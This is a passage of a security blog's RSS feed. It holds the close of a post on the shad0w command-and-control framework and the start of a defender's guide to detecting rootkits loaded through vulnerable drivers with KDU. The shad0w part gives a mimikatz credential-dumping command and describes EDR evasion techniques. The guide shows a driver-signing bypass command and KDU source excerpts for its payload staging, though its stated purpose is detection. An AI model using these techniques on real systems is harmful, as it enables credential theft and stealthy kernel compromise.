&lt;p&gt;This module can be used with the &lt;code&gt;mimikatz&lt;/code&gt; command.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;shad0w ≫ mimikatz -x sekurlsa::logonpasswords&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Any other mimikatz commands can also by run by using the &lt;code&gt;-x&lt;/code&gt; flag.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/mimikatz_resize.gif&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;Defenses&lt;span class=&#34;absolute -mt-20&#34; id=&#34;defenses&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#defenses&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In future blog posts I will be going into a lot more detail into how these defenses work in the secure beacon - but here&amp;rsquo;s a quick overview.&lt;/p&gt;
&lt;p&gt;Currently shad0w uses 3 main defences:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Dynamic in memory code execution&lt;/li&gt;
&lt;li&gt;Directly using syscalls&lt;/li&gt;
&lt;li&gt;Anti DLL injection&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Dynamic in memory code execution&lt;span class=&#34;absolute -mt-20&#34; id=&#34;dynamic-in-memory-code-execution&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#dynamic-in-memory-code-execution&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;This is achieved by safely hijacking alertable threads in a running processes and injecting the modules directly into them. This can help to avoid Sysmon&amp;rsquo;s event ID 8, which can be used to detect process injection.&lt;/p&gt;
&lt;h3&gt;Directly using syscalls&lt;span class=&#34;absolute -mt-20&#34; id=&#34;directly-using-syscalls&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#directly-using-syscalls&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;By directly using native windows syscalls, shad0w is able to avoid any userland API hooks placed by EDR solutions. This will greatly reduce their ability to monitor shad0w.&lt;/p&gt;
&lt;h3&gt;Anti DLL injection&lt;span class=&#34;absolute -mt-20&#34; id=&#34;anti-dll-injection&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#anti-dll-injection&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The main method EDR solutions use to hook and monitor programs is by injecting a DLL into running processes allowing them to watch the inner workings of a program. This is currently combated by two methods: enforcing that only Microsoft signed DLLs are allowed into child processes (not many EDR DLLs are signed by Microsoft) and also by maintaining a whitelist of DLLs that are allowed into processes and blocking all others. This ensures that even if a DLL is signed by Microsoft it will still not be able to enter any of the processes.&lt;/p&gt;
&lt;h2&gt;Stay Up To Date&lt;span class=&#34;absolute -mt-20&#34; id=&#34;stay-up-to-date&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#stay-up-to-date&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;This is a constantly evolving project under active development. There are lots of exciting new features going to be added over the coming weeks so make sure you stay up to date with the lastest changes on this project&amp;rsquo;s &lt;a href=&#34;https://github.com/bats3c/shad0w/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>A Defender’s Guide For Rootkit Detection: Episode 1 - Kernel Drivers</title>
      <link>//localhost:1313/articles/2020/04/2020-04-20-a-defenders-guide-for-rootkit-detection-episode-1-kernel-drivers/</link>
      <pubDate>Mon, 20 Apr 2020 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2020/04/2020-04-20-a-defenders-guide-for-rootkit-detection-episode-1-kernel-drivers/</guid>
      <description>
        
        
        &lt;p&gt;&lt;em&gt;Author: Thom (&lt;/em&gt;&lt;a href=&#34;https://twitter.com/rootkid8&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;em&gt;@rootkid8&lt;/em&gt;&lt;/a&gt;&lt;em&gt;), Sysmon Mastery Help from Rana (&lt;a href=&#34;https://twitter.com/sec_coffee&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@sec_coffee&lt;/a&gt;)&lt;/em&gt;&lt;/p&gt;
&lt;h2&gt;Introduction&lt;span class=&#34;absolute -mt-20&#34; id=&#34;introduction&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#introduction&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Even before my birth, rootkits have been one of the most sophisticated and successful ways of obtaining persistence on a machine, and now in 2020 there are ever more trivial ways of escalating from system to kernel. Recently JUMPSEC’s youngest red team researcher &lt;a href=&#34;https://twitter.com/_batsec_&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@_batsec_&lt;/a&gt; &lt;a href=&#34;https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;raised the bar once more using rootkit techniques to universally evade Sysmon&lt;/a&gt;. This method of defeating Event Tracing for Windows is an incredible feat and the world of Windows logging is left shaken. As a result, we’re going to go down the rabbit hole of kernel driver rootkits, specifically looking at the use of vulnerable kernel drivers to escalate to ring-zero. First we need to start with some basics, how the Windows kernel implements defence-in-depth, how to bypass these restrictions, and how network defenders and system administrators can detect these techniques as “trivially” as attackers can implement them (skip to the end for a Sysmon Config). &lt;/p&gt;
&lt;h2&gt;Some OS Basics&lt;span class=&#34;absolute -mt-20&#34; id=&#34;some-os-basics&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#some-os-basics&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;For those of us who don&amp;rsquo;t know, operating systems and common CPU&amp;rsquo;s define hierarchical protection domains to implement defense in depth. Code executing on the CPU is run in one of these rings using CPU modes - with ring 3 being user-land and ring 0 being kernel-land. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2020-04-16-090738_677x477_scrot.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Only certain applications that require access to low level devices and hardware should be allowed access to run code in rings 2, 1 and 0, which is enforced at a microcode level on the CPU as well as by the operating system. In theory this privilege domain is sound, and its introduction expelled the days of causing total system crashes with one line of buggy code in user-land. However, the implementation of these rings at the operating system level, and worse-so at the driver level is reasonably vague and undocumented, opening up an entire space for kernel driver exploits as post exploitation privilege escalation and persistence mechanisms. &lt;/p&gt;
&lt;h2&gt;Writing a Kernel Mode Driver&lt;span class=&#34;absolute -mt-20&#34; id=&#34;writing-a-kernel-mode-driver&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#writing-a-kernel-mode-driver&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;We’re going to look more closely at how Windows handles device drivers, since these drivers allow access to kernel space, we will hopefully uncover some of the ways to get arbitrary code to run in kernel mode without the use of a signed driver. Heck, &lt;a href=&#34;https://docs.microsoft.com/en-us/windows-hardware/drivers/gettingstarted/writing-a-very-small-kmdf--driver&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;writing a kernel mode driver isn’t a particularly challenging task&lt;/a&gt;, but if you want it to run on a target system it will require setting up “Test Mode” on the operating system or completely disabling device driver signing enforcement (DSE) globally which requires access to the boot settings, or through running the following command followed by a reboot:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;bcdedit /set testsigning on&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Both of these techniques are about as stealthy as using a sledgehammer to hide the noise of your power drill, and not only will most ordinary users recognise the &lt;strong&gt;Test Mode&lt;/strong&gt; warning on their device, many organisations restrict this functionality group wide, &lt;a href=&#34;https://docs.microsoft.com/en-us/windows-hardware/drivers/install/the-testsigning-boot-configuration-option&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;and if they don’t then they really should.&lt;/a&gt; There is of course a way to hide the watermarks and warnings, but again this is a sledgehammer approach since bcdedit will be caught by a blue team with any real level of sophistication.&lt;/p&gt;
&lt;p&gt;Instead, we need to bypass Driver Signature Enforcement and PatchGuard, both of which being Windows kernel protection mechanisms. One to prevent unsigned drivers being loaded and another to prevent drivers from modifying critical kernel data structures through integrity checks. Again, any blue team should be able to detect the loading of a driver with an expired certificate - &lt;a href=&#34;https://github.com/SwiftOnSecurity/sysmon-config&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;SwiftOnSecurity’s handy Sysmon config will anyway!&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;The Story of One Kernel Driver Loader&amp;hellip;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;the-story-of-one-kernel-driver-loader&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#the-story-of-one-kernel-driver-loader&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In order to explore these kernel mode drivers, we need to take a trip back in time. There used to be (and still are) some fantastic base projects for kernel mode drivers like the ones we’re investigating. Written by a legend in this space &lt;a href=&#34;https://twitter.com/hfiref0x?lang=en&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@hfiref0x&lt;/a&gt; - we’ll start with &lt;a href=&#34;https://github.com/hfiref0x/TDL&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;TDL or Turla Driver Loader&lt;/a&gt;. Around 4 years ago, this tool was a rootkit developer&amp;rsquo;s wet dream. It’s the supercedent to &lt;a href=&#34;https://github.com/hfiref0x/DSEFix&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;DSEFix&lt;/a&gt;, another driver loader written by hfiref0x, that became obsolete due to its modification of kernel variables that got blocked by PatchGuard rendering it a guaranteed blue screen generator - a fun prank but not what we’re looking for. &lt;/p&gt;
&lt;p&gt;TDL acts as a fully functional driver loader that can be used independently of the Windows loader. As a byproduct it defeats 64-bit driver signature enforcement as well. The magic of Turla is the offensive technique it uses to get a custom driver to load into kernel memory. It comes packaged with a vulnerable version of a VirtualBox kernel mode driver, it loads and exploits this driver to overwrite kernel memory with a custom crafted driver before jumping to the DriverEntry function to begin execution. Effectively this can be visualised as so:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/Rootkits.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;This technique is somewhat akin to process hollowing, but instead of creating a suspended thread and mapping our code into it, we load a known driver and use shellcode to map our malicious code into that segment of memory.&lt;/p&gt;
&lt;p&gt;The technique is surprisingly simple, but extremely effective. Since the VirtualBox driver runs in kernel mode already, by dropping shellcode that now runs in kernel land we can execute an mmov, an mmap, and a jump (in reality it’s much more complex than that but just for simplicity’s sake we rely on those three instructions). This means that all the target kernel driver needs is permission to read and write physical memory, and have a code execution CVE for it to become a candidate for kernel driver loading.&lt;/p&gt;
&lt;p&gt;Clearly hfiref0x doesn’t sleep, and soon after TDL, &lt;a href=&#34;https://github.com/hfiref0x/Stryker&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Stryker&lt;/a&gt; was released, yet another kernel driver loader. This time the loader was crafted to &lt;a href=&#34;https://www.cpuid.com/softwares/cpu-z.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;exploit a CPU-Z driver&lt;/a&gt; instead, functioning very similarly to its predecessor. Now again in 2020,  hfiref0x strikes again with the release of Kernel Driver Utility (&lt;a href=&#34;https://github.com/hfiref0x/KDU&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;KDU&lt;/a&gt;) just 2 months ago, the same concept is being used, except now KDU supports multiple vulnerable drivers as “functionality providers&amp;rsquo;&amp;rsquo;. Hilariously named, these functionality providers are the keys to the kingdom, and if we have any hopes of detecting rootkits that use this technique we need to understand how KDU loads these drivers, how it exploits them, and what breadcrumbs we can search for on systems to check for compromise.&lt;/p&gt;
&lt;p&gt;Looking briefly at the Github attributes we can see there are 4 CVE’s associated with the project:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2291&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;cve-2015-2291&lt;/a&gt; &lt;a href=&#34;https://github.com/topics/cve-2019-18845&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;/a&gt;- IQVW32.sys intel ethernet driver vulnerability&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18845&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;cve-2019-18845&lt;/a&gt; &lt;a href=&#34;https://github.com/topics/cve-2018-19320&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;/a&gt;- MsIo64.sys and MsIo32.sys Patriot Viper vulnerability&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2018-19320&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;cve-2018-19320&lt;/a&gt; &lt;a href=&#34;https://github.com/topics/cve-2019-16098&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;/a&gt;- GDrv graphics driver vulnerability &lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16098&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;cve-2019-16098&lt;/a&gt; - RTCore64.sys and RTCore32.sys vulnerability&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;With more providers mentioned in the README:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ATSZIO64 driver from ASUSTeK WinFlash utility of various versions;&lt;/li&gt;
&lt;li&gt;GLCKIO2 (WinIo) driver from ASRock Polychrome RGB of version 1.0.4;&lt;/li&gt;
&lt;li&gt;EneIo (WinIo) driver from G.SKILL Trident Z Lighting Control of version 1.00.08;&lt;/li&gt;
&lt;li&gt;WinRing0x64 driver from EVGA Precision X1 of version 1.0.2.0;&lt;/li&gt;
&lt;li&gt;EneTechIo (WinIo) driver from Thermaltake TOUGHRAM software of version 1.0.3.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The most notable thing regarding these vulnerabilities is that they all expose ring-zero code execution capabilities, enabling the entire kill-chain of KDU. Even more interestingly  CVE-2019-16098 even states in the description: &lt;strong&gt;&lt;em&gt;These signed drivers can also be used to bypass the Microsoft driver-signing policy to deploy malicious code.&lt;/em&gt;&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;As a disclaimer, we can note that hfiref0x states KDU and all similar tools are not actually hacking tools, they are for driver developers to make their lives easier. &lt;strong&gt;A lazy AV will flag this tool as malware&lt;/strong&gt;, but also because in many senses of the word, KDU is malware in the same way a remote access tool for sysadmins can be malware.&lt;/p&gt;
&lt;h2&gt;Static Analysis &lt;span class=&#34;absolute -mt-20&#34; id=&#34;static-analysis&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#static-analysis&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;[WARNING: RABBIT HOLE AHEAD]&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;If you’re not interested in KDU source code or boring operating system details then skip to Dynamic Analysis.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Examining the source code of KDU we see an abstraction layer that is implemented by the driver loader, each provider has the following structure:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;144 typedef struct _KDU_PROVIDER {                          
…………………………………………………
161     struct {
162         provRegisterDriver RegisterDriver; //optional
163         provUnregisterDriver UnregisterDriver; //optional
164
165         provAllocateKernelVM AllocateKernelVM; //optional
166         provFreeKernelVM FreeKernelVM; //optional
167
168         provReadKernelVM ReadKernelVM;
169         provWriteKernelVM WriteKernelVM;
170
171         provVirtualToPhysical VirtualToPhysical; //optional
172         provReadControlRegister ReadControlRegister; //optional
173     
174         provQueryPML4 QueryPML4Value; //optional
175         provReadPhysicalMemory ReadPhysicalMemory; //optional
176         provWritePhysicalMemory WritePhysicalMemory; //optional
177     } Callbacks;
178 } KDU_PROVIDER, * PKDU_PROVIDER;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;I’ve ignored the unimportant fields, but from here we can understand what it takes to construct a provider, and we can see there are function pointers required for:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;reading and writing virtual memory, &lt;/li&gt;
&lt;li&gt;mapping virtual addresses to physical addresses, &lt;/li&gt;
&lt;li&gt;reading and writing physical addresses &lt;/li&gt;
&lt;li&gt;reading two kernel registers - the PML4 and the Control Register&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;It should be pretty clear so far why we need to be able to read and write physical and virtual memory addresses, but what are the PML4 and the control register and why does the exploit require them? Well if you’re familiar with Linux kernels then the PML4 is simply the base address to the multi-level page table that the kernel uses to map linear virtual address spaces to processes. In order to replace our driver in memory we need to be able to find where it’s stored in memory which requires reading from the page table to find the address space of the target driver. Hence we can read this base address from the PML4 register. &lt;/p&gt;
&lt;p&gt;The control register should also be familiar to kernel developers or assembly folks, but to those of you who don’t know - it’s a 64-bit register that has a few important use cases required by virtual memory mapping and paging. In cases where either no function is defined for mapping virtual memory to physical memory, and nothing for reading the PML4, KDU uses the control register value to find the page directory address. This allows it to translate virtual addresses to physical addresses so it can walk through the page table and overwrite physical kernel memory regions:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt; 39  BOOL PwVirtualToPhysical(
 40     _In_ HANDLE DeviceHandle,
 41     _In_ provQueryPML4 QueryPML4Routine,
 42     _In_ provReadPhysicalMemory ReadPhysicalMemoryRoutine,
 43     _In_ ULONG_PTR VirtualAddress,
 44     _Out_ ULONG_PTR* PhysicalAddress)
 45 {   
 46     ULONG_PTR   pml4_cr3, selector, table, entry = 0;
 47     INT         r, shift;
 48     
 49     *PhysicalAddress = 0;
 50     
 51     if (QueryPML4Routine(DeviceHandle, &amp;amp;pml4_cr3) == 0)
 52         return 0;
 53     
 54     table = pml4_cr3 &amp;amp; PHY_ADDRESS_MASK;
 55     
 56     for (r = 0; r &amp;lt; 4; r&amp;#43;&amp;#43;) {
 57         
 58         shift = 39 - (r * 9);
 59         selector = (VirtualAddress &amp;gt;&amp;gt; shift) &amp;amp; 0x1ff;
 60         
 61         if (ReadPhysicalMemoryRoutine(DeviceHandle,
 62             table &amp;#43; selector * 8,
 63             &amp;amp;entry,
 64             sizeof(ULONG_PTR)) == 0)
 65         {   
 66             return 0;
 67         }
 68         
 69         if (PwEntryToPhyAddr(entry, &amp;amp;table) == 0)
 70             return 0;
 71         
 72         if ((r == 2) &amp;amp;&amp;amp; ((entry &amp;amp; ENTRY_PAGE_SIZE_BIT) != 0)) {
 73             table &amp;amp;= PHY_ADDRESS_MASK_2MB_PAGES;
 74             table &amp;#43;= VirtualAddress &amp;amp; VADDR_ADDRESS_MASK_2MB_PAGES;
 75             *PhysicalAddress = table;
 76             return 1;
 77         }
 78     }
 79     
 80     table &amp;#43;= VirtualAddress &amp;amp; VADDR_ADDRESS_MASK_4KB_PAGES;
 81     *PhysicalAddress = table;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Digging deeper into the source code we actually discover that there are two drivers at play here: a victim driver and a vulnerable driver. Initially I presumed these to be the same driver, but the code appears to unpack, load and start the vulnerable driver first - this is the &lt;em&gt;provider&lt;/em&gt; - after which it calls KDUMapDriver which tries to load the victim driver.&lt;/p&gt;
&lt;p&gt;In the case of KDU, the victim driver is always the process explorer &lt;strong&gt;PROCEXP152&lt;/strong&gt;.sys driver, it bootstraps shellcode into the IRP_MJ_DEVICE_CONTROL callback of PROCEXP152, before finally unloading it, triggering the shellcode to execute inside PROCEXP152, allowing the target driver to be loaded into kernel memory.&lt;/p&gt;
&lt;p&gt;Finally, let’s take a look at the core loader functionality, we want to understand the shellcode bootstrapping, and the system calls used to help us figure out what level of detection is possible. This snippet of code is where the bootstrapping happens inside KDUSetupShellCode:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;382         //
383         // Resolve import (ntoskrnl only) and write buffer to registry.
384         //
385         isz = FileHeader-&amp;gt;OptionalHeader.SizeOfImage;
386
387         DataBuffer = supHeapAlloc(isz);
388         if (DataBuffer) {
389             RtlCopyMemory(DataBuffer, Image, isz);
390
391             printf_s(&amp;#34;[&amp;#43;] Resolving kernel import for input driverrn&amp;#34;);
392             supResolveKernelImport((ULONG_PTR)DataBuffer, KernelImage, KernelBase);
393             
394             lResult = RegOpenKey(HKEY_LOCAL_MACHINE, NULL, &amp;amp;hKey);
395             if ((lResult == ERROR_SUCCESS) &amp;amp;&amp;amp; (hKey != NULL)) {
396
397                 lResult = RegSetKeyValue(hKey, NULL, TEXT(&amp;#34;~&amp;#34;), REG_BINARY,                                        
398                     DataBuffer, isz);
399
400                 bSuccess = (lResult == ERROR_SUCCESS);
401
402                 RegCloseKey(hKey);
403             }
404             supHeapFree(DataBuffer);
405         }
406     }&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;We see that first it finds the &lt;code&gt;**ntoskrnl**.exe&lt;/code&gt; base address - this is the starting address space of the kernel mapped memory region, containing important structures such as the page directory of mapped memory for all processes on the system. This is important because most process monitoring tools should be able to detect if this image is loaded. After this it calls &lt;code&gt;KDUStorePayload&lt;/code&gt; on the driver filename passed to it - interestingly this function writes a byte buffer that is just the raw bytes of the &lt;strong&gt;&lt;code&gt;rootkit.sys&lt;/code&gt;&lt;/strong&gt; &lt;em&gt;(or whatever input kernel mode driver you specify)&lt;/em&gt; to a registry hive in &lt;code&gt;HKLM&lt;/code&gt; with the key “~”:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2020-04-15-115900_749x165_scrot.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;[&lt;code&gt;4d5a&lt;/code&gt; is hex for &lt;code&gt;MZ&lt;/code&gt; also known as the magic bytes in the header of a PE image.]&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;A fun part of this registry write is that KDU doesn’t clean up after itself so this artifact remains on the system as an IOC even after KDU’s removal. I’ve thrown together a little powershell script that you can find in the appendix for incident responders to check whether any PE data has been written to registry keys. It will detect KDU in it’s default state as well as any basic attempts at KDU modifications that change the target hive, and any other tools that write executable data to the registry.&lt;/p&gt;
&lt;p&gt;Furthermore, we come across this function call inside &lt;code&gt;VictimBuildName&lt;/code&gt; in &lt;code&gt;**victim**.cpp&lt;/code&gt; that writes the victim driver &lt;strong&gt;&lt;code&gt;.sys&lt;/code&gt;&lt;/strong&gt; in the &lt;code&gt;%TEMP%&lt;/code&gt; directory:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt; 61 LPWSTR VictimBuildName(
 62     _In_ LPWSTR VictimName
 63 )
 64 {
 65     LPWSTR FileName;
 66     SIZE_T Length = (1024 &amp;#43; _strlen(VictimName)) * sizeof(WCHAR);
 67
 68     FileName = (LPWSTR)supHeapAlloc(Length);
 69     if (FileName == NULL) {
 70         SetLastError(ERROR_NOT_ENOUGH_MEMORY);
 71     }
 72     else {
 73
 74         DWORD cch = supExpandEnvironmentStrings(L&amp;#34;%temp%\&amp;#34;, FileName, MAX_PATH);
 75         if (cch == 0 || cch &amp;gt; MAX_PATH) {
 76             SetLastError(ERROR_NOT_ENOUGH_MEMORY);
 77             supHeapFree(FileName);
 78             FileName = NULL;
 79         }
 80         else {
 81             _strcat(FileName, VictimName);
 82             _strcat(FileName, L&amp;#34;.sys&amp;#34;);
 83         }
 84     }
 85
 86     return FileName;
 87 }&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;This is exciting, as file writes are also solid ways of detecting malicious activity, especially if the write operations are hardcoded into the executable and not generated on the fly or randomly.&lt;/p&gt;
&lt;h2&gt;Dynamic Analysis&lt;span class=&#34;absolute -mt-20&#34; id=&#34;dynamic-analysis&#34;&gt;&lt;/span&gt;
